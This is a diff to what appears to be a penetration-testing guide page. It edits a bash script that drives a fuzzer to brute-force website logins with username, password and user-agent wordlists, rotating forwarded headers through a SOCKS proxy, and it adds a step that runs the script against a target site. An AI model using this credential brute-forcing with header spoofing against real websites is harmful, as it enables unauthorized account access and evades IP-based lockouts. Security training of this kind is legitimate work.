@@ -213,7 +213,7 @@ Create Script
 {% endhint %}
 
 ```bash
-sudo nano x-forwarded-bruteforce.sh
+sudo nano forwarded-bruteforce.sh
 ```
 
 ```bash
@@ -409,7 +409,7 @@ if [[ "$METHOD" == "get" ]]; then
          -w "$USERLIST:FUZZ1" \
          -w "$PASSLIST:FUZZ2" \
          -w "$UI:FUZZ3" \
-         -w "$FORWARDED:FUZZ4" \
+         -w "/tmp/forwarded.txt:FUZZ4" \
          -x "socks4://127.0.0.1:16379" \
          -X GET \
          -ac -c -r -mc 200 \
@@ -420,11 +420,19 @@ else
          -w "$USERLIST:FUZZ1" \
          -w "$PASSLIST:FUZZ2" \
          -w "$UI:FUZZ3" \
-         -w "$FORWARDED:FUZZ4" \
+         -w "/tmp/forwarded.txt:FUZZ4" \
          -x "socks4://127.0.0.1:16379" \
          -X POST -d "$DATA" \
          -ac -c -r -mc 200 \
          -H "FUZZ4" \
          "${HEADERS[@]}"
 fi
+```
+
+{% hint style="info" %}
+Run Script
+{% endhint %}
+
+```bash
+sudo chmod +x forwarded-bruteforce.sh;sudo ./forwarded-bruteforce.sh $WEBSITE
 ```
